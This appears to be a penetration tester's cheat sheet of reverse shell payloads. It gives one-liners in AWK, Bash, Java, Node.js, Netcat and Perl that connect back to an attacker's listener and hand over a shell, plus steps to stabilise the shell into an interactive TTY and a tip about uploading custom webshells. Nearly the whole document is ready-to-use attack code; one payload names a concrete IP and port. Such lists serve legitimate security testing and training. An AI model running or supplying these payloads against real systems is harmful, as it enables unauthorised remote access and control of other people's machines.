**Note: If prebuilt webshells are not processing reverse shell payloads try to upload our own webshell and try achieving reverse shell IMP Note: use bash -c "rev shell payload here" if regular ones didnt work**

## AWK 
```
awk 'BEGIN {s = "/inet/tcp/0/192.168.45.215/4444";while(42) { do{ printf"shell>" | & s; s | & getline c; if(c){ while ((c | & getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## BASH
```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1  

0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/LHOST/LPORT && while read line 0<&5; do $line 2>&5 >&5; done
```
## JAVA
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>& 5 >&5; done"] as String[]); p.waitFor()
```
## JAVASCRIPT
```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh",[]);varclient=newnet.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```
## NETCAT
```
nc -e /bin/sh LHOST LPORT  

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc LHOST LPORT >/tmp/f  

rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc LHOST LPORT 1>/tmp/backpipe 

rm -f backpipe; mknod /tmp/backpipe p && nc LHOST LPORT 0<backpipe | /bin/bash 1>backpipe
```
## PERL
```
perl -e 'use Socket;$i="LHOST"; 

$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Spawn TTY
Get Interactive Shell  
```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
Ctrl+z
ps -p $$
change to bash  
stty raw -echo  
fg
reset (wait a few seconds before entering this) 
export TERM=xterm
```